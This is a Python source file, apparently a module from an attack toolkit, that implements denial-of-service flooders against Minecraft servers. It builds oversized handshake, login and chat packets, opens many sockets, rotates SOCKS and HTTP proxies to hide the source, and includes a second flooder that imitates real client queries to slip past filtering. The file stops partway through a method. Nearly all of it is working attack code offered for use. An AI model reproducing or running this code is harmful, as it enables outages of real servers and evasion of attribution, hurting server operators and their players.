import struct
import json
import random
import time
import logging
import socket
import zlib
import socks  # For SOCKS proxy support
import requests  # For proxy validation
import asyncio
import threading
from typing import List, Dict, Optional, Tuple, Union
from .utilities import AttackModule, UI, Style

class MinecraftFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False,
                 proxies: List[str] = None, proxy_type: str = "socks5",
                 proxy_timeout: float = 2.0, proxy_rotation: bool = True):
        
        # Check for required dependency before proceeding
        try:
            import mcstatus
            from mcstatus.pinger import PingResponse
            self.mcstatus = mcstatus
        except ImportError:
            raise ImportError("Missing required module 'mcstatus'. Please install it with: pip install mcstatus")
            
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # Proxy configuration
        self.proxies = proxies or []
        self.proxy_type = proxy_type.lower()  # socks5, socks4, http
        self.proxy_timeout = proxy_timeout
        self.proxy_rotation = proxy_rotation
        self.proxy_index = 0
        self.proxy_lock = asyncio.Lock()
        self.working_proxies = []
        self.proxy_stats = {
            "total": len(self.proxies),
            "working": 0,
            "failed": 0,
            "rotations": 0
        }
        
        # Add thread-safe stats
        self._stats_lock = asyncio.Lock()
        self._stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        
        # Initialize stats monitoring
        self.last_update_time = time.time()
        self.update_interval = 1.0
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Status format - updated to match desired style
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: MINECRAFT-{method} | RPS: {pps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate}%"
        
        # Minecraft protocol settings - expanded range
        self.protocol_versions = [
            47,     # 1.8.x
            107,    # 1.9
            210,    # 1.10.x
            315,    # 1.11
            335,    # 1.12
            340,    # 1.12.1
            393,    # 1.13
            401,    # 1.13.1
            404,    # 1.13.2
            498,    # 1.14.4
            573,    # 1.15.1
            735,    # 1.16
            751,    # 1.16.2
            754,    # 1.16.5
            755,    # 1.17.1
            757,    # 1.18.2
            760,    # 1.19.2
            763     # 1.20.1
        ]
        self.server_address = None
        self.server_port = 25565  # Default Minecraft port
        self.connection_timeout = 0.5
        self.max_failures = 5000
        
        # Optimized settings
        self.sockets_per_thread = 150  # Increased socket count
        self.reconnect_delay = 0.001   # Minimal delay
        self.max_retries = 2
        self.connection_backoff_factor = 1.2
        
        # Attack methods
        self.attack_methods = [
            "status_ping",       # Standard server list ping
            "login_spam",        # Send login packets
            "chat_spam",         # Send login then chat packets
            "packet_fragments",  # Send incomplete packets
            "oversized_ping"     # Send oversized status ping
        ]
        
        # Adjusted method weights for throughput
        self.method_weights = {
            "status_ping": 60,    # Most efficient method
            "login_spam": 30,     # Second most efficient
            "chat_spam": 5,
            "packet_fragments": 3,
            "oversized_ping": 2
        }
        
        # Status ping payloads
        self.ping_payloads = self._generate_ping_payloads()
        
        # Login payloads
        self.usernames = self._generate_usernames(200)  # Create 200 random usernames
        self.login_payloads = self._generate_login_payloads()
        
        # Chat spam messages
        self.chat_messages = self._generate_chat_messages(100)  # 100 different messages
        
        # Dynamic resource adjustment
        self.adaptive_mode = True
        self.last_adjustment_time = time.time()
        self.adjustment_interval = 5.0  # Seconds between load adjustments
        
        # Add thread management
        self.thread_list = []
        self._stop_event = threading.Event()
        
        # Add resource management
        self._cleanup_lock = threading.Lock()
        self._resources = {
            "sockets": [],
            "threads": [],
            "tasks": []
        }
        
        if debug:
            # Configure logger with custom format
            self.logger = logging.getLogger(self.__class__.__name__)
            self.logger.setLevel(logging.DEBUG)
            formatter = logging.Formatter('[%(asctime)s] %(message)s', '%H:%M:%S')
            handler = logging.StreamHandler()
            handler.setFormatter(formatter)
            self.logger.handlers = [handler]  # Replace existing handlers

    def write_varint(self, value: int) -> bytes:
        """Write VarInt for Minecraft protocol"""
        result = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            if value:
                byte |= 0x80
            result += bytes([byte])
            if not value:
                break
        return result
    
    def write_string(self, value: str) -> bytes:
        """Write a string with length prefix (VarInt)"""
        utf_value = value.encode('utf-8')
        return self.write_varint(len(utf_value)) + utf_value
    
    def _generate_usernames(self, count: int) -> List[str]:
        """Generate a list of random usernames for login flood"""
        adjectives = ['Happy', 'Sad', 'Angry', 'Brave', 'Lucky', 'Epic', 'Pro', 'Fast', 
                      'Swift', 'Clever', 'Wild', 'Royal', 'Silent', 'Shadow', 'Quick']
        nouns = ['Player', 'Miner', 'Gamer', 'Ninja', 'Warrior', 'Knight', 'Hunter', 'Wizard',
                'Assassin', 'Archer', 'Dragon', 'Wolf', 'Tiger', 'Eagle', 'Fox']
        
        usernames = []
        for _ in range(count):
            adj = random.choice(adjectives)
            noun = random.choice(nouns)
            num = random.randint(1, 9999)
            username = f"{adj}{noun}{num}"
            usernames.append(username)
            
        return usernames

    def _generate_chat_messages(self, count: int) -> List[str]:
        """Generate a list of chat messages for chat spam"""
        messages = []
        
        # Base message patterns
        patterns = [
            "Hello everyone!",
            "I'm new here, can someone help me?",
            "How do I get diamonds?",
            "Where is the nearest village?",
            "Can anyone teleport me?",
            "Looking for teammates",
            "Who wants to trade?",
            "Free diamonds at spawn!",
            "Follow me for a surprise",
            "Anyone want to join my faction?"
        ]
        
        # Generate variations of patterns with random suffixes
        for _ in range(count):
            base = random.choice(patterns)
            if random.random() < 0.7:  # 70% chance to add suffix
                suffix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(3, 8)))
                message = f"{base} {suffix}"
            else:
                message = base
            messages.append(message)
            
        return messages

    def _generate_ping_payloads(self) -> List[bytes]:
        """Generate a variety of Minecraft server list ping payloads"""
        payloads = []
        
        def create_handshake(protocol: int, hostname: str, port: int, next_state: int = 1) -> bytes:
            # Build packet without length prefix first
            packet = b'\x00'  # Packet ID
            packet += self.write_varint(protocol)
            
            # Generate massive padding (5-10x larger)
            padding = "A" * random.randint(5000, 10000)
            padded_hostname = f"{hostname}.{padding}.example.com"
            packet += self.write_string(padded_hostname)
            
            packet += struct.pack('>H', port)
            packet += self.write_varint(next_state)
            
            # Add huge chunks of compressed data
            compressed_data = zlib.compress(b'X' * random.randint(10000, 20000))
            packet += compressed_data
            
            return self.write_varint(len(packet)) + packet

        # Generate base domains
        domains = ["localhost", "mc.example.com", "test.server.local"]
        
        for protocol in self.protocol_versions:
            for domain in domains:
                # Create massive data blocks
                large_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(15000)]))
                
                # Standard handshake + status
                handshake = create_handshake(protocol, domain, 25565)
                status_request = self.write_varint(1) + b'\x00' + large_data
                payloads.append(handshake + status_request)
                
                # Add huge ping payload
                ping_data = struct.pack('>Q', int(time.time() * 1000))
                huge_padding = zlib.compress(b'X' * random.randint(20000, 30000))
                ping_packet = self.write_varint(len(ping_data + huge_padding)) + b'\x01' + ping_data + huge_padding
                payloads.append(handshake + ping_packet)
        
        return payloads

    def _generate_login_payloads(self) -> List[bytes]:
        """Generate massive login packets"""
        login_payloads = []
        
        for protocol in self.protocol_versions:
            for username in random.sample(self.usernames, min(5, len(self.usernames))):
                # Create huge padding for handshake
                padding = "X" * random.randint(5000, 10000)
                
                # Handshake packet with login state
                handshake = b'\x00'
                handshake += self.write_varint(protocol)
                handshake += self.write_string(f"localhost.{padding}.local")
                handshake += struct.pack('>H', 25565)
                handshake += b'\x02'
                handshake_packet = self.write_varint(len(handshake)) + handshake
                
                # Massive login packet
                login_start = b'\x00'
                login_start += self.write_string(username + "_" + "A" * random.randint(3000, 5000))
                
                # Add huge compressed custom data
                custom_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(20000)]))
                login_start += custom_data
                
                if protocol >= 760:  # 1.19+
                    uuid_data = b'\x00' * 16
                    login_start += uuid_data
                    login_start += zlib.compress(b'X' * random.randint(15000, 25000))
                
                login_start_packet = self.write_varint(len(login_start)) + login_start
                login_payloads.append(handshake_packet + login_start_packet)
                
        return login_payloads

    def generate_chat_payload(self, protocol: int, username: str, message: str) -> bytes:
        """Generate massive chat packet payload"""
        # Create huge padding
        padding = "A" * random.randint(5000, 10000)
        padded_message = f"{message} {padding}"
        
        if protocol < 340:  # Pre-1.12.2
            chat_packet = b'\x02'
            chat_packet += self.write_string(padded_message)
            chat_packet += zlib.compress(b'X' * random.randint(10000, 20000))
        else:
            chat_packet = b'\x03'
            chat_packet += self.write_string(padded_message)
            chat_packet += b'\x00'
            
            # Add massive compressed payload
            custom_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(25000)]))
            chat_packet += custom_data
            
            if protocol >= 760:
                uuid_data = b'\x00' * 16
                chat_packet += uuid_data
                chat_packet += zlib.compress(b'X' * random.randint(20000, 30000))
        
        return self.write_varint(len(chat_packet)) + chat_packet

    async def increment_stat(self, key: str, value: int = 1):
        """Async thread-safe method to increment stats"""
        async with self._stats_lock:
            self._stats[key] += value

    def parse_proxy_string(self, proxy_str: str) -> Tuple[str, int, Optional[str], Optional[str]]:
        """Parse a proxy string into components (host, port, username, password)"""
        # Format: [username:password@]host:port
        auth_part = None
        host_part = proxy_str
        
        if '@' in proxy_str:
            auth_part, host_part = proxy_str.split('@', 1)
        
        host, port_str = host_part.split(':', 1)
        port = int(port_str)
        
        username = None
        password = None
        if auth_part:
            if ':' in auth_part:
                username, password = auth_part.split(':', 1)
            else:
                username = auth_part
        
        return host, port, username, password

    def get_proxy_type_code(self) -> int:
        """Convert proxy type string to socks module constant"""
        if self.proxy_type == "socks4":
            return socks.SOCKS4
        elif self.proxy_type == "socks5":
            return socks.SOCKS5
        elif self.proxy_type == "http":
            return socks.HTTP
        else:
            # Default to SOCKS5
            return socks.SOCKS5

    async def get_next_proxy(self) -> Optional[Dict]:
        """Get the next proxy from the rotation in an async thread-safe way"""
        if not self.proxies:
            return None
        async with self.proxy_lock:
            if not self.working_proxies and self.proxy_rotation:
                # If we've tested all proxies and have working ones, use only those
                if self.proxy_stats["working"] > 0:
                    return random.choice(self.working_proxies)
                # Otherwise, try from the original list again
                self.proxy_index = 0
                
            if self.proxy_index >= len(self.proxies):
                self.proxy_index = 0
                self.proxy_stats["rotations"] += 1
                
            proxy_str = self.proxies[self.proxy_index]
            self.proxy_index += 1
            
            try:
                host, port, username, password = self.parse_proxy_string(proxy_str)
                return {
                    "host": host,
                    "port": port,
                    "username": username,
                    "password": password,
                    "type": self.get_proxy_type_code()
                }
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error parsing proxy {proxy_str}: {str(e)}")
                return None

    def test_proxy(self, proxy: Dict) -> bool:
        """Test if a proxy is working"""
        try:
            test_sock = socks.socksocket()
            test_sock.set_proxy(
                proxy_type=proxy["type"],
                addr=proxy["host"],
                port=proxy["port"],
                username=proxy["username"],
                password=proxy["password"]
            )
            test_sock.settimeout(self.proxy_timeout)
            
            # Try to connect to a reliable host
            test_sock.connect(("1.1.1.1", 80))
            test_sock.close()
            
            # Add to working proxies list
            with self.proxy_lock:
                proxy_str = f"{proxy['host']}:{proxy['port']}"
                if proxy["username"] and proxy["password"]:
                    proxy_str = f"{proxy['username']}:{proxy['password']}@{proxy_str}"
                
                if proxy_str not in self.working_proxies:
                    self.working_proxies.append(proxy_str)
                    self.proxy_stats["working"] += 1
                    
            return True
        except Exception:
            with self.proxy_lock:
                self.proxy_stats["failed"] += 1
            return False
        finally:
            try:
                test_sock.close()
            except:
                pass

    def create_socket(self, target: str, port: int, proxy: Dict = None) -> Optional[socket.socket]:
        """Optimized socket creation with proxy support"""
        try:
            if proxy:
                # Create a SOCKS socket
                sock = socks.socksocket()
                sock.set_proxy(
                    proxy_type=proxy["type"],
                    addr=proxy["host"],
                    port=proxy["port"],
                    username=proxy["username"],
                    password=proxy["password"]
                )
            else:
                # Create a regular socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            # Common socket options
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(self.connection_timeout if not proxy else self.proxy_timeout)
            
            # Connect to target
            sock.connect((target, port))
            return sock
        except Exception as e:
            if self.debug and proxy:
                self.logger.debug(f"Proxy connection failed: {proxy['host']}:{proxy['port']} - {str(e)}")
            return None

    def send_packet_safely(self, sock: socket.socket, data: bytes) -> bool:
        """Send packet with error handling"""
        if not sock:
            return False

        try:
            sock.send(data)
            # Synchronously increment stats for immediate effect
            # Use thread-safe lock for stats
            if hasattr(self, "_stats_lock"):
                # For asyncio.Lock, use asyncio.run_coroutine_threadsafe if in thread, else await
                if isinstance(self._stats_lock, asyncio.Lock):
                    # If in async context, use await
                    try:
                        loop = asyncio.get_running_loop()
                        loop.create_task(self.increment_stat("packets_sent"))
                        loop.create_task(self.increment_stat("bytes_sent", len(data)))
                    except RuntimeError:
                        # Not in async context, fallback to direct increment (may race)
                        self._stats["packets_sent"] += 1
                        self._stats["bytes_sent"] += len(data)
                else:
                    with self._stats_lock:
                        self._stats["packets_sent"] += 1
                        self._stats["bytes_sent"] += len(data)
            else:
                self._stats["packets_sent"] += 1
                self._stats["bytes_sent"] += len(data)
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            # Synchronously increment failures
            if hasattr(self, "_stats_lock"):
                if isinstance(self._stats_lock, asyncio.Lock):
                    try:
                        loop = asyncio.get_running_loop()
                        loop.create_task(self.increment_stat("failures"))
                    except RuntimeError:
                        self._stats["failures"] += 1
                else:
                    with self._stats_lock:
                        self._stats["failures"] += 1
            else:
                self._stats["failures"] += 1
            return False

    async def flood_worker(self, target: str, port: int):
        """Async worker function with batch processing and proxy support"""
        sockets = []
        failures = 0
        consecutive_failures = 0
        backoff_time = self.reconnect_delay
        last_success_time = time.time()
        current_proxy = None
        proxy_failures = 0
        
        # Pre-generate packet batches
        ping_batch = random.sample(self.ping_payloads, min(10, len(self.ping_payloads)))
        login_batch = random.sample(self.login_payloads, min(10, len(self.login_payloads)))
        
        while self.running and failures < self.max_failures:
            try:
                current_time = time.time()
                if current_time - last_success_time > 3:  # Reduced reset time
                    sockets = []
                    consecutive_failures = 0
                    backoff_time = self.reconnect_delay
                    last_success_time = current_time
                    
                    # Rotate proxy if needed
                    if self.proxies and (current_proxy is None or proxy_failures > 3):
                        current_proxy = await self.get_next_proxy()
                        if current_proxy and not self.test_proxy(current_proxy):
                            current_proxy = None
                        proxy_failures = 0

                # Create multiple sockets at once
                new_sockets = []
                for _ in range(3):  # Try to maintain 3 active sockets
                    sock = self.create_socket(target, port, current_proxy)
                    if sock:
                        new_sockets.append(sock)
                    elif current_proxy:
                        proxy_failures += 1
                        if proxy_failures > 3:
                            # Try a different proxy
                            current_proxy = await self.get_next_proxy()
                            if current_proxy and not self.test_proxy(current_proxy):
                                current_proxy = None
                            proxy_failures = 0

                if new_sockets:
                    for sock in new_sockets:
                        # Send multiple packets per socket
                        for _ in range(5):  # Increased packets per socket
                            success = False
                            attack_method = self.choose_attack_method()
                            
                            try:
                                if attack_method == "status_ping":
                                    for payload in ping_batch:
                                        success = self.send_packet_safely(sock, payload)
                                        if success:
                                            await self.increment_stat("successful")
                                elif attack_method == "login_spam":
                                    for payload in login_batch:
                                        success = self.send_packet_safely(sock, payload)
                                        if success:
                                            await self.increment_stat("successful")
                                else:
                                    # Other methods
                                    if attack_method == "chat_spam":
                                        success = self.chat_spam_attack(sock, target, port)
                                    elif attack_method == "packet_fragments":
                                        success = self.packet_fragment_attack(sock, target, port)
                                    elif attack_method == "oversized_ping":
                                        success = self.oversized_ping_attack(sock, target, port)
                            
                                if success:
                                    last_success_time = time.time()
                                    consecutive_failures = 0
                                    backoff_time = self.reconnect_delay
                                    proxy_failures = 0
                                    
                            except:
                                break
                            
                            await asyncio.sleep(0.0001)  # Minimal delay between packets
                        
                        sockets.append(sock)
                        if len(sockets) > self.sockets_per_thread:
                            old_sock = sockets.pop(0)
                            try:
                                old_sock.close()
                            except:
                                pass
                
                else:
                    consecutive_failures += 1
                    failures += 1
                    
                    if consecutive_failures > 3:
                        backoff_time = min(backoff_time * 1.2, 0.1)  # Reduced max backoff
                        await asyncio.sleep(backoff_time)
                    else:
                        await asyncio.sleep(self.reconnect_delay)
                    continue
                
                await asyncio.sleep(0.001)  # Minimal delay between connections
                
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in flood_worker: {str(e)}")
                failures += 1
                consecutive_failures += 1
                await asyncio.sleep(backoff_time)
        
        # Cleanup sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def _show_stats_loop(self):
        """Show real-time stats in a loop"""
        last_packets = 0
        last_bytes = 0
        last_time = time.time()

        # Print initial status immediately
        for target in self.targets:
            for port in self.ports:
                timestamp = time.strftime("%H:%M:%S", time.localtime())
                status_msg = f"[{timestamp}] Target: {target} | Port: {port} | Waiting for connections... (no packets sent yet)"
                print(status_msg)

        while self.running and not self._stop_event.is_set():
            current_time = time.time()
            elapsed = current_time - last_time

            if elapsed >= 1.0:
                # Use the same lock as increment_stat for thread safety
                if hasattr(self, "_stats_lock"):
                    lock = self._stats_lock
                    # For asyncio.Lock, can't use as context manager in thread, so just read
                    if isinstance(lock, asyncio.Lock):
                        stats = self._stats.copy()
                    else:
                        with lock:
                            stats = self._stats.copy()
                else:
                    stats = self._stats.copy()

                current_packets = stats["packets_sent"]
                current_bytes = stats["bytes_sent"]
                successful = stats["successful"]
                total = current_packets
                if total == 0:
                    success_rate = 0
                else:
                    # Clamp to [0, 100]
                    success_rate = min(max((successful / total) * 100, 0), 100)

                # Update last values
                last_packets = current_packets
                last_bytes = current_bytes
                last_time = current_time

                # Always print a status message, even if no packets sent
                for target in self.targets:
                    for port in self.ports:
                        timestamp = time.strftime("%H:%M:%S", time.localtime())
                        if total == 0:
                            status_msg = f"[{timestamp}] Target: {target} | Port: {port} | Waiting for connections... (no packets sent yet)"
                        else:
                            status_msg = f"[{timestamp}] Target: {target} | Port: {port} | Method: MINECRAFT-{self.choose_attack_method().upper()} | Success Rate: {int(success_rate)}%"
                        print(status_msg)  # Print with newline

                # Adjust resources if adaptive mode is enabled
                if self.adaptive_mode:
                    self.adjust_resources()

            time.sleep(1.0)  # Update every second

    def show_stats(self):
        """Start stats display thread if not already running"""
        if hasattr(self, '_stats_thread') and self._stats_thread and self._stats_thread.is_alive():
            return
        self._stats_thread = threading.Thread(target=self._show_stats_loop)
        self._stats_thread.daemon = True
        self._stats_thread.start()

    async def start(self):
        """Start the async Minecraft flood operation with improved resource tracking"""
        # Print operation header and configuration
        UI.print_header("Minecraft Flood Operation")
        UI.print_info(f"Starting Minecraft flood against {len(self.targets)} targets on {len(self.ports)} ports")
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Sockets per thread: {self.sockets_per_thread}")
        print(f"- Adaptive mode: {'Enabled' if self.adaptive_mode else 'Disabled'}")
        print(f"- Proxy support: {'Enabled' if self.proxies else 'Disabled'}")
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")

        self.show_stats()  # Always start stats thread this way

        # Give stats thread a moment to print before workers start
        await asyncio.sleep(0.1)

        self.running = True
        self._stop_event.clear()
        tasks = []

        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    task = asyncio.create_task(self.flood_worker(target, port))
                    tasks.append(task)
                    self._resources["tasks"].append(task)
        try:
            await asyncio.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
            await self.stop()
            # Optionally: cancel all tasks immediately
            for task in tasks:
                task.cancel()
            return
        except asyncio.CancelledError:
            pass
        finally:
            await self.stop()
            await asyncio.gather(*tasks, return_exceptions=True)

    async def stop(self):
        """Stop the operation gracefully with improved resource cleanup"""
        if not self.running:
            return
        
        UI.print_warning("\nStopping operation gracefully...")
        self.running = False
        self._stop_event.set()
        
        # Stop stats thread first
        if hasattr(self, '_stats_thread') and self._stats_thread and self._stats_thread.is_alive():
            self._stats_thread.join(timeout=0.1)
            self._stats_thread = None
        
        try:
            # Cancel all tasks
            tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
            for task in tasks:
                task.cancel()
            
            # Wait for tasks to complete with timeout
            if tasks:
                await asyncio.wait(tasks, timeout=1.0)
            
            # Clean up resources
            for sock in self._resources.get("sockets", []):
                try:
                    sock.close()
                except:
                    pass
            
            self._resources["sockets"].clear()
            self._resources["tasks"].clear()
            
            UI.print_success("Operation stopped successfully")
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error during stop: {e}")
            raise

    def status_ping_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send Minecraft status ping packets with improved error handling"""
        if not sock or not self or self._stop_event.is_set():
            return False

        try:
            payload = random.choice(self.ping_payloads)
            success = self.send_packet_safely(sock, payload)

            if success and not self._stop_event.is_set():
                try:
                    sock.settimeout(0.5)
                    response = sock.recv(1024)
                    if response and self:
                        asyncio.create_task(self.increment_stat("successful"))
                        self.show_stats()
                except socket.timeout:
                    if self:
                        asyncio.create_task(self.increment_stat("successful"))
                        self.show_stats()
            return success
        except Exception as e:
            if self and self.debug:
                self.logger.error(f"Error in status_ping_attack: {str(e)}")
            if self:
                asyncio.create_task(self.increment_stat("failures"))
                self.show_stats()
            return False

    def login_spam_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send Minecraft login packets with improved error handling"""
        if not sock or not self or self._stop_event.is_set():
            return False

        try:
            payload = random.choice(self.login_payloads)
            success = self.send_packet_safely(sock, payload)

            if success and not self._stop_event.is_set():
                if self:
                    asyncio.create_task(self.increment_stat("successful"))
                    self.show_stats()
                try:
                    sock.settimeout(0.3)
                    response = sock.recv(1024)
                except socket.timeout:
                    pass
            return success
        except Exception as e:
            if self and self.debug:
                self.logger.error(f"Error in login_spam_attack: {str(e)}")
            if self:
                asyncio.create_task(self.increment_stat("failures"))
                self.show_stats()
            return False

    def choose_attack_method(self) -> str:
        """Choose an attack method based on weighted distribution"""
        # Get the list of methods and their weights
        methods = list(self.method_weights.keys())
        weights = list(self.method_weights.values())

        # Use random.choices with weights for better distribution
        chosen_method = random.choices(methods, weights=weights, k=1)[0]

        # Log the chosen method in the new format if in debug mode
        if self.debug:
            timestamp = time.strftime("%H:%M:%S", time.localtime())
            for target in self.targets:
                for port in self.ports:
                    total = self._stats["packets_sent"]
                    if total == 0:
                        rate = 0
                    else:
                        rate = min((self._stats["successful"] / total) * 100, 100)  # Clamp to 100%
                    msg = f"[{timestamp}] Target: {target} | Port: {port} | Method: MINECRAFT-{chosen_method.upper()} | Success Rate: {int(rate)}%"
                    print(msg)  # Print with newline

        return chosen_method

    def stop_now(self):
        """Synchronous immediate stop for external calls"""
        self.running = False
        self._stop_event.set()
        
        # Stop stats thread immediately
        if hasattr(self, '_stats_thread') and self._stats_thread and self._stats_thread.is_alive():
            self._stats_thread.join(timeout=0.1)
            self._stats_thread = None

class MinecraftLegitimateClient(AttackModule):
    """
    A more sophisticated Minecraft client simulator that mimics legitimate client behavior
    using the mcstatus library to generate protocol-compliant traffic.
    """
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False):
                 
        # Check for required dependency before proceeding
        try:
            import mcstatus
            self.mcstatus = mcstatus
        except ImportError:
            raise ImportError("Missing required module 'mcstatus'. Please install it with: pip install mcstatus")
            
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # Client behavior settings
        self.client_types = ["browser", "launcher", "bedrock", "query"]
        self.client_weights = [60, 30, 5, 5]  # Weight distribution for client types
        self.query_interval = 0.5  # Time between queries in seconds
        self.max_concurrent = threads * 10  # Maximum concurrent connections
        self._stats_thread = None
        
        # Client version simulation
        self.java_versions = [
            "1.8.9", "1.12.2", "1.16.5", "1.17.1", "1.18.2", "1.19.2", "1.20.1"
        ]
        self.bedrock_versions = [
            "1.16.220", "1.17.30", "1.18.30", "1.19.50", "1.20.0"
        ]
        
        # Client mods simulation
        self.mod_packs = [
            "Vanilla", "Forge", "Fabric", "OptiFine", "Lunar Client", "Badlion"
        ]
        
        # Semaphore to limit concurrent connections
        self._connection_semaphore = asyncio.Semaphore(self.max_concurrent)
        
        # Stats tracking
        self._stats_lock = threading.Lock()
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0,
            "browser_queries": 0,
            "launcher_queries": 0,
            "bedrock_queries": 0,
            "server_queries": 0
        }
    
    def _show_stats_loop(self):
        """Display ongoing statistics about the operation"""
        last_packets = 0
        last_bytes = 0
        last_time = time.time()
        
        while self.running:
            current_time = time.time()
            elapsed = current_time - last_time
            
            if elapsed >= 1.0:
                with self._stats_lock:
                    current_packets = self.stats["packets_sent"]
                    current_bytes = self.stats["bytes_sent"]
                    success_rate = (self.stats["successful"] / max(1, current_packets)) * 100
                
                # Calculate rates
                packets_per_second = (current_packets - last_packets) / elapsed
                mbps = ((current_bytes - last_bytes) * 8 / 1_000_000) / elapsed
                
                # Update last values
                last_packets = current_packets
                last_bytes = current_bytes
                last_time = current_time
                
                # Display stats for each target and port
                for target in self.targets:
                    for port in self.ports:
                        timestamp = time.strftime("%H:%M:%S", time.localtime())
                        status_msg = (
                            f"[{timestamp}] Target: {target} | Port: {port} | "
                            f"Method: MINECRAFT-LEGIT | PPS: {packets_per_second:.2f} | "
                            f"BPS: {mbps:.2f} MB | Success Rate: {success_rate:.0f}% | "
                            f"B:{self.stats['browser_queries']} L:{self.stats['launcher_queries']} "
                            f"BE:{self.stats['bedrock_queries']} Q:{self.stats['server_queries']}"
                        )
                        print(status_msg)  # Print with newline
            
            time.sleep(0.1)
    
    def update_stats(self, key: str, value: int = 1, bytes_sent: int = 0):
        """Thread-safe method to update stats"""
        with self._stats_lock:
            self.stats[key] += value
            self.stats["packets_sent"] += value
            self.stats["bytes_sent"] += bytes_sent
    
    def choose_client_type(self) -> str:
        """Choose a client type based on weighted distribution"""
        return random.choices(self.client_types, weights=self.client_weights, k=1)[0]
    
    async def simulate_browser_query(self, target: str, port: int):
        """Simulate a browser-based server list query"""
        async with self._connection_semaphore:
            try:
                # Create server object
                server = self.mcstatus.JavaServer(f"{target}:{port}")
                
                # Perform status query (simulates browser refresh)
                status = await server.async_status()
                
                # Extract and process response data
                response_size = len(str(status.raw))
                self.update_stats("browser_queries", 1, response_size)
                self.update_stats("successful", 1)
                
                # Simulate occasional ping after status
                if random.random() < 0.3:  # 30% chance to ping
                    latency = await server.async_ping()
                    self.update_stats("packets_sent", 1, 64)  # Approximate ping packet size
                
                return True
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Browser query error: {str(e)}")
                self.update_stats("failures", 1)
                return False
    
    async def simulate_launcher_query(self, target: str, port: int):
        """Simulate a Minecraft launcher connection attempt"""
        async with self._connection_semaphore:
            try:
                # Create server object
                server = self.mcstatus.JavaServer(f"{target}:{port}")
                
                # First do status query (launcher checks server before connecting)
                status = await server.async_status()
                self.update_stats("launcher_queries", 1, len(str(status.raw)))
                
                # Simulate ping to check latency
                latency = await server.async_ping()
                self.update_stats("packets_sent", 1, 64)
                
                # Simulate partial connection sequence
                # This is just a simulation - we don't actually try to authenticate
                client_version = random.choice(self.java_versions)
                mod_pack = random.choice(self.mod_packs)
                
                # Simulate handshake + login start packet
                # We're estimating packet sizes here
                handshake_size = 100 + len(target) + len(client_version) + len(mod_pack)
                self.update_stats("packets_sent", 1, handshake_size)
                
                # Simulate receiving encryption request
                # Then simulate client disconnecting (as we can't complete auth)
                self.update_stats("successful", 1)
                
                return True
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Launcher query error: {str(e)}")
                self.update_stats("failures", 1)
                return False
    
    async def simulate_bedrock_query(self, target: str, port: int):
        """Simulate a Bedrock edition client query"""
        async with self._connection_semaphore:
            try:
                # For Bedrock, we need to use a different port typically
                # But we'll try the provided port first, then 19132 if that fails
                try:
                    # Try the provided port first
                    server = self.mcstatus.BedrockServer(f"{target}:{port}")
                    status = await server.async_status()
                except:
                    # Fall back to default Bedrock port
                    bedrock_port = 19132
                    server = self.mcstatus.BedrockServer(f"{target}:{bedrock_port}")
                    status = await server.async_status()
                
                # Process response
                response_size = len(str(status.raw))
                self.update_stats("bedrock_queries", 1, response_size)
                self.update_stats("successful", 1)
                
                # Simulate a version mismatch response
                bedrock_version = random.choice(self.bedrock_versions)
                mismatch_packet_size = 80 + len(bedrock_version)
                self.update_stats("packets_sent", 1, mismatch_packet_size)
                
                return True
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Bedrock query error: {str(e)}")
                self.update_stats("failures", 1)
                return False
    
    async def simulate_server_query(self, target: str, port: int):
        """Simulate a server query (used by monitoring tools and server lists)"""
        async with self._connection_semaphore:
            try:
                # Create server object
                server = self.mcstatus.JavaServer(f"{target}:{port}")
                
                # Perform full query (requires query to be enabled on server)
                try:
                    query = await server.async_query()
                    response_size = len(str(query.raw))
                    self.update_stats("server_queries", 1, response_size)
                    self.update_stats("successful", 1)
                except:
                    # Fall back to status if query fails
                    status = await server.async_status()
                    response_size = len(str(status.raw))
                    self.update_stats("server_queries", 1, response_size)
                    self.update_stats("successful", 1)
                
                return True
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Server query error: {str(e)}")
